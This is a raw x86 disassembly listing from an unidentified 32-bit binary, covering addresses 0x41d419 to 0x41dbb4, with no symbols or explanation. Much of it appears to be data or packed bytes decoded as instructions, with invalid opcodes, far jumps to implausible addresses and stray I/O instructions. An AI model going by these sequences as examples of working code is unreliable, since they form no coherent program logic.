  41d419:	dec    esi
  41d41a:	lahf   
  41d41b:	dec    edi
  41d41c:	cmp    eax,0x3c4fa04e
  41d421:	dec    esi
  41d422:	xor    BYTE PTR [esi+0x3f],cl
  41d425:	dec    esi
  41d426:	pop    esp
  41d427:	in     eax,dx
  41d428:	pop    edi
  41d429:	loop   0x41d49a
  41d42b:	repnz outs dx,BYTE PTR ds:[esi]
  41d42d:	repz jle 0x41d433
  41d430:	jns    0x41d432
  41d432:	jle    0x41d447
  41d434:	jns    0x41d446
  41d436:	cmp    al,0x4e
  41d438:	jg     0x41d488
  41d43a:	xor    BYTE PTR [esi-0x65],cl
  41d43d:	dec    edi
  41d43e:	xor    cl,BYTE PTR [esi-0x80]
  41d441:	dec    edi
  41d442:	cmp    al,0x4e
  41d444:	lods   eax,DWORD PTR ds:[esi]
  41d445:	dec    edi
  41d446:	cmp    ecx,DWORD PTR [esi+0x30]
  41d449:	dec    esi
  41d44a:	inc    ebp
  41d44b:	dec    esi
  41d44c:	pop    esp
  41d44d:	or     eax,0x126f025f
  41d452:	outs   dx,BYTE PTR ds:[esi]
  41d453:	adc    edi,DWORD PTR [esi+0x23]
  41d456:	jns    0x41d478
  41d458:	aas    
  41d459:	dec    esi
  41d45a:	add    BYTE PTR [eax],al
  41d45c:	in     al,0xd2
  41d45e:	inc    ecx
  41d45f:	add    al,bl
  41d461:	aam    0x41
  41d463:	add    al,ah
  41d465:	aam    0x41
  41d467:	add    BYTE PTR [eax-0x2a],ch
  41d46a:	inc    ecx
  41d46b:	add    ah,dl
  41d46d:	aad    0x41
  41d46f:	add    BYTE PTR [eax-0x2a],bl
  41d472:	inc    ecx
  41d473:	add    al,al
  41d475:	aam    0x41
  41d477:	add    ah,al
  41d479:	aam    0x41
  41d47b:	add    BYTE PTR [esi+edx*8+0x41],dl
  41d47f:	add    BYTE PTR [eax],ch
  41d481:	aad    0x41
  41d483:	add    BYTE PTR ds:0x36f89ca9,cl
  41d489:	mov    edx,0xd4dcf89c
  41d48e:	inc    ecx
  41d48f:	add    BYTE PTR [ebp+edx*8-0x2a5fffbf],cl
  41d496:	inc    ecx
  41d497:	add    BYTE PTR [ebp+edx*8-0x2a43ffbf],ch
  41d49e:	inc    ecx
  41d49f:	add    BYTE PTR [edx*8-0x2d1fffbf],dl
  41d4a6:	inc    ecx
  41d4a7:	add    BYTE PTR [edx*8-0x2adbffbf],dh
  41d4ae:	inc    ecx
  41d4af:	add    BYTE PTR [esi+edx*8+0x41],ch
  41d4b3:	add    BYTE PTR [esi+0x19f89c85],dh
  41d4b9:	or     edx,DWORD PTR [edi]
  41d4bb:	sub    eax,0x140041d4
  41d4c1:	sbb    al,0x16
  41d4c3:	or     DWORD PTR [eax],0x7050d
  41d4c9:	add    BYTE PTR [eax+0x0],al
  41d4cc:	cmp    al,BYTE PTR [edx+0x3e]
  41d4cf:	ds retf 0x4247
  41d4d3:	add    BYTE PTR [ebp+0x55],ch
  41d4d6:	inc    esp
  41d4d7:	imul   ecx,DWORD PTR [eax],0x86275fa
  41d4dd:	in     eax,dx
  41d4de:	inc    BYTE PTR [edi]
  41d4e0:	aas    
  41d4e1:	cli    
  41d4e2:	mov    ds:0x41d4d005,eax
  41d4e7:	add    BYTE PTR [ebp-0x4a07636b],dh
  41d4ed:	xchg   esi,eax
  41d4ee:	pushf  
  41d4ef:	clc    
  41d4f0:	mov    ah,0x95
  41d4f2:	pushf  
  41d4f3:	clc    
  41d4f4:	mov    ebx,0xbaf89c95
  41d4f9:	xchg   ebp,eax
  41d4fa:	pushf  
  41d4fb:	clc    
  41d4fc:	mov    ecx,0xb8f89c95
  41d501:	xchg   ebp,eax
  41d502:	pushf  
  41d503:	clc    
  41d504:	mov    edi,0xbef89c95
  41d509:	xchg   ebp,eax
  41d50a:	pushf  
  41d50b:	clc    
  41d50c:	mov    ebp,0xa6f89c95
  41d511:	xchg   ebp,eax
  41d512:	pushf  
  41d513:	clc    
  41d514:	jmp    0x41d2:0xd86003f9
  41d51b:	add    BYTE PTR [eax+edx*1+0x77530042],cl
  41d522:	jbe    0x41d574
  41d524:	mov    dh,0x85
  41d526:	pushf  
  41d527:	clc    
  41d528:	sbb    ecx,ebp
  41d52a:	push   eax
  41d52b:	pop    es
  41d52c:	es pop es
  41d52e:	add    BYTE PTR [eax],al
  41d530:	aam    0xd2
  41d532:	inc    ecx
  41d533:	add    BYTE PTR [ebx],bl
  41d535:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41d568:	mov    WORD PTR [eax],ss
  41d56a:	inc    edx
  41d56b:	add    BYTE PTR [esi+0x67f89c85],dh
  41d571:	pushw  0x68
  41d574:	addr16 push 0x67
  41d577:	pushw  0x6b6a
  41d57b:	push   0x676b67
	...
  41d588:	es aas 
  41d58a:	inc    eax
  41d58b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41d591:	dec    edi
  41d592:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d593:	dec    edi
  41d594:	lahf   
  41d595:	dec    edi
  41d596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d597:	dec    edi
  41d598:	ins    DWORD PTR es:[edi],dx
  41d599:	dec    esi
  41d59a:	bound  ecx,QWORD PTR [esi+0x30]
  41d59d:	dec    esi
  41d59e:	add    BYTE PTR [eax],al
  41d5a0:	cdq    
  41d5a1:	dec    edi
  41d5a2:	pushf  
  41d5a3:	dec    edi
  41d5a4:	fwait
  41d5a5:	dec    edi
  41d5a6:	ins    DWORD PTR es:[edi],dx
  41d5a7:	dec    esi
  41d5a8:	bound  ecx,QWORD PTR [esi+0x30]
  41d5ab:	dec    esi
  41d5ac:	scas   eax,DWORD PTR es:[edi]
  41d5ad:	dec    edi
  41d5ae:	lods   eax,DWORD PTR ds:[esi]
  41d5af:	dec    edi
  41d5b0:	lahf   
  41d5b1:	dec    edi
  41d5b2:	mov    ds:0x624e6d4f,al
  41d5b7:	dec    esi
  41d5b8:	xor    BYTE PTR [esi+0x0],cl
  41d5bb:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d5c1:	dec    edi
  41d5c2:	test   eax,0xa04f934f
  41d5c7:	dec    edi
  41d5c8:	fwait
  41d5c9:	dec    edi
  41d5ca:	xor    BYTE PTR [esi+0x0],cl
  41d5cd:	add    BYTE PTR [eax],al
  41d5cf:	add    BYTE PTR [eax],al
  41d5d1:	add    BYTE PTR [eax],al
  41d5d3:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d5da:	mov    WORD PTR [ebp-0x32734274],gs
  41d5e0:	mov    ebp,ds
  41d5e2:	mov    ebp,gs
  41d5e4:	mov    ebp,?
  41d5e6:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d5ec:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d5f2:	mov    WORD PTR [edx-0x74],?
  41d5f5:	jae    0x41d583
  41d5f7:	jo     0x41d585
  41d5f9:	jno    0x41d587
  41d5fb:	jbe    0x41d589
  41d5fd:	ja     0x41d58b
  41d5ff:	je     0x41d58d
  41d601:	jne    0x41d58f
  41d603:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d60a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d610:	lods   al,BYTE PTR ds:[esi]
  41d611:	jge    0x41d5cf
  41d613:	jge    0x41d5b3
  41d615:	(bad)  
  41d616:	jns    0x41d68b
  41d618:	mov    ecx,0x7d738cb1
  41d61d:	ins    DWORD PTR es:[edi],dx
  41d61e:	enter  0x9fc6,0x26
  41d622:	jb     0x41d627
  41d624:	test   eax,0xb956bb17
  41d629:	hlt    
  41d62a:	test   al,0x37
  41d62c:	test   al,0x7e
  41d62e:	fnstenv [ecx-0x6a]
  41d631:	mov    cl,0x6a
  41d633:	push   0xffffffce
  41d635:	or     BYTE PTR [edx],bl
  41d637:	xlat   BYTE PTR ds:[ebx]
  41d638:	out    dx,eax
  41d639:	add    eax,0x9321d7aa
  41d63e:	scas   al,BYTE PTR es:[edi]
  41d63f:	adc    DWORD PTR [esi],esp
  41d641:	jge    0x41d666
  41d643:	fidiv  WORD PTR [edi]
  41d645:	leave  
  41d646:	hlt    
  41d647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d648:	cmp    ax,0x1fc8
  41d64c:	mov    dh,cl
  41d64e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d64f:	(bad)  
  41d650:	and    DWORD PTR [eax],ebx
  41d652:	and    DWORD PTR [ecx-0x18],esi
  41d655:	(bad)  [ebx+0x7]
  41d658:	cmc    
  41d659:	enter  0x301a,0x40
  41d65d:	adc    BYTE PTR [edx+0x0],al
  41d660:	jno    0x41d6c8
  41d662:	jp     0x41d6d2
  41d664:	enter  0x41d4,0x0
  41d668:	sub    al,0xd5
  41d66a:	inc    ecx
  41d66b:	add    BYTE PTR [eax],cl
  41d66d:	in     eax,dx
  41d66e:	adc    al,BYTE PTR [edi]
  41d670:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d677:	ins    BYTE PTR es:[edi],dx
  41d678:	push   0x49657557
  41d67d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d683:	push   edi
  41d684:	ins    BYTE PTR es:[edi],dx
  41d685:	inc    edx
  41d686:	push   0x76666a73
  41d68b:	inc    edx
  41d68c:	jo     0x41d6d7
  41d68e:	dec    ebp
  41d68f:	dec    ebp
  41d690:	pop    edx
  41d691:	jp     0x41d6ed
  41d693:	jbe    0x41d6db
  41d695:	pop    ecx
  41d696:	jo     0x41d710
	...
  41d6ac:	inc    ebp
  41d6ad:	push   edx
  41d6ae:	jb     0x41d724
  41d6b0:	inc    esi
  41d6b1:	je     0x41d6f4
  41d6b3:	inc    esi
  41d6b4:	jae    0x41d72c
  41d6b6:	dec    ebx
  41d6b7:	gs inc edx
  41d6b9:	inc    bx
  41d6bb:	push   ebp
  41d6bc:	jno    0x41d734
  41d6be:	ja     0x41d727
  41d6c0:	dec    edi
  41d6c1:	dec    esp
  41d6c2:	dec    ebp
  41d6c3:	inc    edx
  41d6c4:	jno    0x41d737
  41d6c6:	jae    0x41d71b
  41d6c8:	dec    eax
  41d6c9:	inc    ebp
  41d6ca:	inc    esp
  41d6cb:	inc    esp
  41d6cc:	push   ecx
  41d6cd:	dec    edx
  41d6ce:	ins    BYTE PTR es:[edi],dx
  41d6cf:	dec    ebx
  41d6d0:	jbe    0x41d740
  41d6d2:	pop    eax
  41d6d3:	jbe    0x41d720
  41d6d5:	inc    ecx
  41d6d6:	fs gs jno 0x41d747
  41d6da:	push   ebx
  41d6db:	inc    ecx
  41d6dc:	add    BYTE PTR [eax],al
  41d6de:	inc    ebx
  41d6df:	outs   dx,BYTE PTR ds:[esi]
  41d6e0:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d6e4:	push   edx
  41d6e5:	push   ecx
  41d6e6:	push   0x74000064
  41d6eb:	jne    0x41d762
  41d6ed:	ins    DWORD PTR es:[edi],dx
  41d6ee:	push   ecx
  41d6ef:	push   eax
  41d6f0:	jo     0x41d76c
  41d6f2:	addr16 jo 0x41d74b
  41d6f5:	pop    eax
  41d6f6:	add    BYTE PTR [eax],al
  41d6f8:	push   ecx
  41d6f9:	pop    ecx
  41d6fa:	inc    ebx
  41d6fb:	inc    edx
  41d6fc:	outs   dx,BYTE PTR ds:[esi]
  41d6fd:	popa   
  41d6fe:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d702:	jne    0x41d772
  41d704:	dec    ebx
  41d705:	add    BYTE PTR [ecx+0x45],bh
  41d708:	bound  ebp,QWORD PTR [ecx+0x46]
  41d70b:	dec    ecx
  41d70c:	ja     0x41d753
  41d70e:	dec    eax
  41d70f:	inc    ebp
  41d710:	inc    edx
  41d711:	push   ebx
  41d712:	add    BYTE PTR [eax],al
  41d714:	je     0x41d779
  41d716:	bound  esp,QWORD PTR [edi+0x78]
  41d719:	dec    eax
  41d71a:	bound  edx,QWORD PTR [ebx+0x43]
  41d71d:	pop    eax
  41d71e:	outs   dx,DWORD PTR ds:[esi]
  41d71f:	push   0x4355
  41d724:	inc    edi
  41d725:	gs ins BYTE PTR es:[edi],dx
  41d727:	dec    esp
  41d728:	js     0x41d792
  41d72a:	inc    edx
  41d72b:	js     0x41d773
  41d72d:	arpl   WORD PTR [eax],ax
  41d72f:	add    BYTE PTR [eax],al
  41d731:	add    BYTE PTR [eax],al
  41d733:	add    BYTE PTR [edx+0x70],cl
  41d736:	jb     0x41d7b0
  41d738:	outs   dx,DWORD PTR ds:[esi]
  41d739:	pop    eax
  41d73a:	dec    ebx
  41d73b:	push   esp
  41d73c:	dec    esp
  41d73d:	jns    0x41d78a
  41d73f:	js     0x41d7b9
  41d741:	outs   dx,BYTE PTR ds:[esi]
  41d742:	pop    ecx
  41d743:	jae    0x41d7b3
  41d745:	push   0x43644448
  41d74a:	arpl   WORD PTR [edx+0x55],sp
  41d74d:	push   0x42504e67
  41d752:	push   ebp
  41d753:	je     0x41d7ca
  41d755:	addr16 dec edi
  41d757:	dec    esp
  41d758:	inc    edx
  41d759:	ins    DWORD PTR es:[edi],dx
  41d75a:	inc    esi
  41d75b:	inc    esi
  41d75c:	inc    esi
  41d75d:	arpl   WORD PTR [edx+0x47],bx
  41d760:	push   ebp
  41d761:	inc    ebx
  41d762:	popa   
  41d763:	push   edx
  41d764:	dec    esp
  41d765:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d76c:	push   ecx
  41d76d:	push   ebx
  41d76e:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d775:	dec    edx
  41d776:	jns    0x41d7e1
  41d778:	push   edx
  41d779:	inc    ebx
  41d77a:	jo     0x41d7f1
  41d77c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d780:	fs push ebx
  41d782:	inc    ebx
  41d783:	push   ebp
  41d784:	push   eax
  41d785:	ja     0x41d801
  41d787:	jp     0x41d7d6
  41d789:	push   esi
  41d78a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d78e:	dec    edx
  41d78f:	dec    esi
  41d790:	data16 ja 0x41d7e1
  41d793:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d79a:	dec    esp
  41d79b:	cmp    ebx,ebp
  41d79d:	dec    esp
  41d79e:	lods   eax,DWORD PTR ds:[esi]
  41d79f:	out    dx,al
  41d7a0:	mov    ebp,0xa53ddffb
  41d7a5:	js     0x41d760
  41d7a7:	cwde   
  41d7a8:	arpl   bx,ax
  41d7aa:	pop    ebp
  41d7ab:	jnp    0x41d743
  41d7ad:	add    DWORD PTR [eax],eax
  41d7af:	lods   al,BYTE PTR ds:[esi]
  41d7b0:	add    BYTE PTR [eax],al
  41d7b2:	add    BYTE PTR [esi-0x78],ch
  41d7b5:	adc    eax,0x50dcc7e7
  41d7ba:	add    al,0x77
  41d7bc:	inc    ebp
  41d7bd:	repnz and DWORD PTR [edi+ecx*4-0x57],ebx
  41d7c2:	jbe    0x41d843
  41d7c4:	cmp    eax,0x4219f654
  41d7c9:	in     al,0x3f
  41d7cb:	dec    esp
  41d7cc:	jg     0x41d773
  41d7ce:	hlt    
  41d7cf:	jecxz  0x41d758
  41d7d1:	jmp    0x41d81b
  41d7d3:	popf   
  41d7d4:	cmp    ch,cl
  41d7d6:	repnz hlt 
  41d7d8:	push   ss
  41d7d9:	mov    ecx,0xff917a0d
  41d7de:	inc    ebp
  41d7df:	pop    ecx
  41d7e0:	fcomi  st,st(5)
  41d7e2:	xlat   BYTE PTR ds:[ebx]
  41d7e3:	jnp    0x41d7d2
  41d7e5:	cwde   
  41d7e6:	xlat   BYTE PTR ds:[ebx]
  41d7e7:	xchg   ebx,eax
  41d7e8:	cmp    bh,BYTE PTR [ebp-0x1d]
  41d7eb:	in     al,0x49
  41d7ed:	shl    BYTE PTR [edx-0x25],cl
  41d7f0:	xor    eax,0xbe824e29
  41d7f5:	jmp    0x41d818
  41d7f7:	lods   eax,DWORD PTR ds:[esi]
  41d7f8:	rol    BYTE PTR [edx],0x3e
  41d7fb:	sti    
  41d7fc:	mov    dh,0x54
  41d7fe:	fcmovu st,st(5)
  41d800:	clc    
  41d801:	cmp    eax,0x68132741
  41d806:	out    0x18,al
  41d808:	call   0x2e629467
  41d80d:	stc    
  41d80e:	xchg   DWORD PTR ds:0xe54e04f1,esi
  41d814:	sbb    DWORD PTR [eax],edx
  41d816:	sbb    esi,DWORD PTR [edi-0x29]
  41d819:	dec    ebx
  41d81a:	call   0xd041:0x68ceb7ed
  41d821:	int    0xb0
  41d823:	dec    edi
  41d824:	cmp    BYTE PTR [esi+eiz*8+0x3f1be699],0x2a
  41d82c:	and    al,0x43
  41d82e:	or     DWORD PTR [edi],edi
  41d830:	mov    al,0x72
  41d832:	jbe    0x41d813
  41d834:	outs   dx,BYTE PTR ds:[esi]
  41d835:	mov    esp,0xd8ca1d47
  41d83a:	mov    ah,0xdb
  41d83c:	test   DWORD PTR [edi-0x2],ecx
  41d83f:	push   ebx
  41d840:	dec    ecx
  41d841:	add    BYTE PTR [ecx],al
  41d843:	loope  0x41d8a2
  41d845:	xchg   ebp,eax
  41d846:	xchg   ebp,eax
  41d847:	xor    ecx,esp
  41d849:	mov    ds:0xeb8f872b,al
  41d84e:	lahf   
  41d84f:	dec    edx
  41d850:	and    DWORD PTR [eax-0x3fdee446],edx
  41d856:	inc    ebx
  41d857:	repz cmp al,0xe6
  41d85a:	adc    eax,0x3be5122c
	...
  41d86b:	sub    BYTE PTR [edx+0x57bf52a5],dh
  41d871:	(bad)  
  41d872:	cli    
  41d873:	jl     0x41d8d9
  41d875:	xlat   BYTE PTR ds:[ebx]
  41d876:	push   esi
  41d877:	add    al,0xeb
  41d879:	clc    
  41d87a:	adc    esp,DWORD PTR [edi]
  41d87c:	xchg   edi,eax
  41d87d:	add    DWORD PTR [eax],eax
  41d87f:	lods   al,BYTE PTR ds:[esi]
  41d880:	add    BYTE PTR [eax],al
  41d882:	add    BYTE PTR [edx+edi*4+0x6e],dl
  41d886:	or     eax,0x20984436
  41d88b:	dec    eax
  41d88c:	jmp    0x41d816
  41d88e:	xor    DWORD PTR [edi],ebx
  41d890:	test   DWORD PTR [edi+0x4b],ebp
  41d893:	idiv   DWORD PTR [edi+0x730b1c62]
  41d899:	add    ah,al
  41d89b:	push   ebp
  41d89c:	inc    ebx
  41d89d:	scas   eax,DWORD PTR es:[edi]
  41d89e:	rol    BYTE PTR [esp+ebx*4],1
  41d8a1:	sub    cl,ch
  41d8a3:	inc    edi
  41d8a4:	in     al,0x5f
  41d8a6:	adc    edi,DWORD PTR [ebx+0x0]
  41d8a9:	jge    0x41d910
  41d8ab:	mov    al,ds:0x4cb81b0e
  41d8b0:	jge    0x41d8a9
  41d8b2:	repz jne 0x41d8b1
  41d8b5:	scas   al,BYTE PTR es:[edi]
  41d8b6:	test   BYTE PTR [edi],cl
  41d8b8:	sbb    ebx,DWORD PTR [ecx-0x3726cc76]
  41d8be:	cmp    BYTE PTR [esi+eiz*4+0x5e31e1d8],cl
  41d8c5:	cmc    
  41d8c6:	and    dl,dl
  41d8c8:	adc    al,0xb6
  41d8ca:	jne    0x41d915
  41d8cc:	int3   
  41d8cd:	sbb    BYTE PTR [ebp+esi*8-0x55729a60],0xeb
  41d8d5:	test   BYTE PTR [esi+0x4c6a833c],cl
  41d8db:	jae    0x41d8ec
  41d8dd:	cmp    dl,bl
  41d8df:	xor    ah,BYTE PTR [ecx]
  41d8e1:	retf   0xa1e0
  41d8e4:	repz cmp eax,0x5b6c511b
  41d8ea:	(bad)
  41d8ed:	loopne 0x41d8e4
  41d8ef:	das    
  41d8f0:	(bad)  
  41d8f1:	sti    
  41d8f2:	shl    edi,0x14
  41d8f5:	jnp    0x41d878
  41d8f7:	mov    eax,0x2eaedd4d
  41d8fc:	retf   0x60b7
  41d8ff:	jno    0x41d8f9
  41d901:	jbe    0x41d8c8
  41d903:	sub    eax,DWORD PTR [edx+0x67]
  41d906:	push   ebp
  41d907:	rcl    DWORD PTR [esi-0x44],0xb1
  41d90b:	out    dx,al
  41d90c:	mov    DWORD PTR [edi+0x4b3a4cfe],ebx
  41d912:	out    dx,al
  41d913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d914:	je     0x41d91b
  41d916:	mov    al,0xec
  41d918:	fwait
  41d919:	imul   ecx,edi,0x97ef8ac9
  41d91f:	lea    esi,[ecx+edx*8+0x13446bd7]
  41d926:	xchg   ebp,eax
  41d927:	mul    DWORD PTR [eax]
  41d929:	loop   0x41d997
  41d92b:	lahf   
  41d92c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d92d:	leave  
  41d92e:	inc    DWORD PTR [eax]
	...
  41d938:	add    BYTE PTR [eax],al
  41d93a:	add    BYTE PTR [ebx-0x7e80ab],dh
  41d940:	stos   DWORD PTR es:[edi],eax
  41d941:	push   DWORD PTR [edi-0x42]
  41d944:	xchg   esi,eax
  41d945:	push   0xd5c6b057
  41d94a:	psrlq  mm2,QWORD PTR [edi+0xac0001]
  41d951:	add    BYTE PTR [eax],al
  41d953:	inc    ecx
  41d954:	add    eax,0x2ab66ba5
  41d959:	out    dx,al
  41d95a:	or     al,BYTE PTR [edi]
  41d95c:	mov    eax,ds:0xafd5a35f
  41d961:	jmp    0x41d926
  41d963:	sar    edi,1
  41d965:	cmp    al,0x58
  41d967:	cmp    BYTE PTR [ecx+0x54],ch
  41d96a:	inc    esp
  41d96b:	out    0xbd,al
  41d96d:	sub    BYTE PTR [ebx+0x46],ch
  41d970:	add    DWORD PTR [esi+0x6a],esi
  41d973:	lahf   
  41d974:	ins    BYTE PTR es:[edi],dx
  41d975:	je     0x41d981
  41d977:	push   edx
  41d978:	mov    bl,0xfa
  41d97a:	xchg   DWORD PTR [ebx-0x5f37af77],ebx
  41d980:	cmp    edi,DWORD PTR ds:0xae31c3ce
  41d986:	pop    es
  41d987:	(bad)  
  41d988:	dec    esp
  41d989:	sar    DWORD PTR [edx],0x82
  41d98c:	fstsw  WORD PTR [esi-0x54b30383]
  41d993:	stc    
  41d994:	imul   eax,DWORD PTR ds:0x375968cb,0xffffffa0
  41d99b:	xchg   ebp,eax
  41d99c:	fst    DWORD PTR [edi]
  41d99e:	inc    eax
  41d99f:	addr16 out 0xdb,eax
  41d9a2:	pusha  
  41d9a3:	(bad)  
  41d9a4:	stos   DWORD PTR es:[edi],eax
  41d9a5:	add    eax,0x49b13fed
  41d9aa:	mov    esi,0x5b2bf00e
  41d9af:	les    ebp,FWORD PTR [edi-0x12]
  41d9b2:	mov    eax,0x80c91215
  41d9b7:	and    esp,edx
  41d9b9:	test   esp,0x69ca927c
  41d9bf:	mov    dl,0x2b
  41d9c1:	dec    ebp
  41d9c2:	pushf  
  41d9c3:	mov    al,ds:0x9d265b6b
  41d9c8:	fwait
  41d9c9:	add    BYTE PTR [esp+0x28],bh
  41d9cd:	xchg   ecx,eax
  41d9ce:	add    eax,0x1cd14fa
  41d9d3:	repz inc esp
  41d9d5:	dec    eax
  41d9d6:	loop   0x41d9e9
  41d9d8:	cli    
  41d9d9:	in     eax,dx
  41d9da:	data16 jmp 0x41da2f
  41d9dd:	xchg   BYTE PTR [ebx+eax*1-0x6a],ch
  41d9e1:	and    esp,DWORD PTR [edx]
  41d9e3:	add    ch,0x3e
  41d9e6:	inc    ebx
  41d9e7:	bnd jae 0x41d974
  41d9ea:	stc    
  41d9eb:	aam    0x93
  41d9ed:	es je  0x41da37
  41d9f0:	mov    bl,BYTE PTR [eax]
  41d9f2:	mov    ebp,0x8605f767
  41d9f7:	pop    ecx
  41d9f8:	push   ss
  41d9f9:	dec    ecx
  41d9fa:	xor    esi,DWORD PTR [edi]
  41d9fc:	aad    0x41
  41d9fe:	push   cs
	...
  41da0b:	cmp    dh,dl
  41da0d:	cmp    ah,BYTE PTR [esi+edi*8]
  41da10:	in     al,dx
  41da11:	fimul  WORD PTR ds:[edi-0x6a53942b]
  41da18:	adc    BYTE PTR [ebp+0x1987f5c],0x0
  41da1f:	lods   al,BYTE PTR ds:[esi]
  41da20:	add    BYTE PTR [eax],al
  41da22:	add    bh,cl
  41da24:	jmp    0x2f92e596
  41da29:	aam    0xad
  41da2b:	adc    eax,DWORD PTR ss:[esi-0x1156ac90]
  41da32:	mov    edx,0x643f691b
  41da37:	test   eax,0x6c8f5ad
  41da3c:	adc    dh,BYTE PTR [ebp+0x6ee7960f]
  41da42:	fadd   st(5),st
  41da44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da45:	jmp    0x69d85ba4
  41da4a:	xchg   edx,eax
  41da4b:	mov    bl,0x7c
  41da4d:	fucomp st(3)
  41da4f:	pop    ss
  41da50:	fld    TBYTE PTR [eax+0x2d]
  41da53:	add    BYTE PTR [ebx],ah
  41da55:	inc    esp
  41da56:	mov    ds:0x9b15f3f0,eax
  41da5b:	cmp    BYTE PTR [ebx],dl
  41da5d:	je     0x41da79
  41da5f:	mov    edi,0x857e4aa9
  41da64:	mov    ch,0xda
  41da66:	cs pop edx
  41da68:	fs dec esi
  41da6a:	or     BYTE PTR [ebx],bh
  41da6c:	sub    ebp,edi
  41da6e:	or     eax,0x40b26849
  41da73:	push   es
  41da74:	mov    eax,ebp
  41da76:	sti    
  41da77:	ret    0xe17b
  41da7a:	loop   0x41da44
  41da7c:	test   al,0x47
  41da7e:	loop   0x41da50
  41da80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da81:	add    dl,dl
  41da83:	jmp    0xa0fd3d6f
  41da88:	cmp    eax,0xfa806449
  41da8d:	aam    0xce
  41da8f:	loop   0x41da13
  41da91:	aam    0xc6
  41da93:	add    eax,0x419349c1
  41da98:	mov    ds:0xd47be908,eax
  41da9d:	adc    DWORD PTR [edx*2-0x78bbc377],ecx
  41daa4:	pop    ebp
  41daa5:	xchg   esp,eax
  41daa6:	xor    DWORD PTR cs:[ebp+0x67],eax
  41daaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daab:	add    esi,eax
  41daad:	jg     0x41da46
  41daaf:	mov    bl,0x9b
  41dab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dab2:	sbb    eax,0x344ef6c7
  41dab7:	dec    edx
  41dab8:	xchg   edx,eax
  41dab9:	dec    eax
  41daba:	sbb    al,0xb4
  41dabc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dabd:	mov    DWORD PTR [esi+0x3e7888de],esp
  41dac3:	or     eax,0x87753f60
  41dac8:	mov    ch,0x2b
  41daca:	xchg   edi,eax
  41dacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dacc:	lea    edx,[ecx]
  41dace:	pop    edx
	...
  41dadb:	fnstenv [esi-0x2490e49a]
  41dae1:	std    
  41dae2:	neg    BYTE PTR [esi]
  41dae4:	sub    esp,DWORD PTR [ebx-0x23]
  41dae7:	in     eax,0x19
  41dae9:	shl    DWORD PTR [esi+0x2b],cl
  41daec:	cdq    
  41daed:	add    DWORD PTR [eax],eax
  41daef:	lods   al,BYTE PTR ds:[esi]
  41daf0:	add    BYTE PTR [eax],al
  41daf2:	add    cl,dl
  41daf4:	je     0x41da9f
  41daf6:	jecxz  0x41daf2
  41daf8:	push   edx
  41daf9:	cwde   
  41dafa:	stos   DWORD PTR es:[edi],eax
  41dafb:	inc    ecx
  41dafc:	xchg   ebp,eax
  41dafd:	pop    esp
  41dafe:	fild   DWORD PTR [edi]
  41db00:	dec    esp
  41db01:	fidivr DWORD PTR [ebp-0x470ab3ab]
  41db07:	inc    ebx
  41db08:	pushf  
  41db09:	xchg   edx,eax
  41db0a:	imul   edi,DWORD PTR [ecx-0x599866a8],0x2ea90d9f
  41db14:	shl    BYTE PTR [ebp+0x24],0xcc
  41db18:	adc    eax,0x1e68879e
  41db1d:	sub    BYTE PTR [eax+0x7a],0xe9
  41db21:	jns    0x41db90
  41db23:	jae    0x41daca
  41db25:	das    
  41db26:	jmp    0x63d71ca2
  41db2b:	and    eax,0xe8789b63
  41db30:	fs call 0x5942cbd2
  41db36:	jmp    0x99ef54eb
  41db3b:	sbb    esi,edx
  41db3d:	call   0xfbfdbba6
  41db42:	into   
  41db43:	leave  
  41db44:	and    eax,0x68a5d549
  41db49:	cdq    
  41db4a:	int3   
  41db4b:	fcom   QWORD PTR [eax-0x18]
  41db4e:	push   ebp
  41db4f:	aas    
  41db50:	fstp   TBYTE PTR [ecx+0x38440b01]
  41db56:	or     edx,DWORD PTR es:[edx+0x2512f92b]
  41db5d:	xor    eax,0xbffa63dd
  41db62:	xor    bh,dh
  41db64:	xchg   ebx,eax
  41db65:	push   es
  41db66:	int3   
  41db67:	dec    esi
  41db68:	sub    esp,0x9880d928
  41db6e:	jo     0x41db72
  41db70:	mov    ah,0x9e
  41db72:	push   ds
  41db73:	xchg   esi,eax
  41db74:	retf   
  41db75:	dec    esp
  41db76:	xor    dh,BYTE PTR ds:0x3aebf151
  41db7c:	cmp    DWORD PTR [esi-0x4598a9a1],eax
  41db82:	jg     0x41db39
  41db84:	or     BYTE PTR [esi+0x36],al
  41db87:	sub    eax,0xe979e8b7
  41db8c:	jae    0x41db62
  41db8e:	lods   al,BYTE PTR ds:[esi]
  41db8f:	or     eax,0xa394ccca
  41db94:	into   
  41db95:	jmp    0x2136:0x6634fa4c
  41db9c:	adc    eax,ecx
  41db9e:	mov    ebp,0x0
	...
  41dbab:	fidiv  DWORD PTR [edx]
  41dbad:	xchg   edi,eax
  41dbae:	mov    bh,bh
  41dbb0:	scas   eax,DWORD PTR es:[edi]
  41dbb1:	fbstp  TBYTE PTR [edx+0x3]
  41dbb4:	inc    ebp
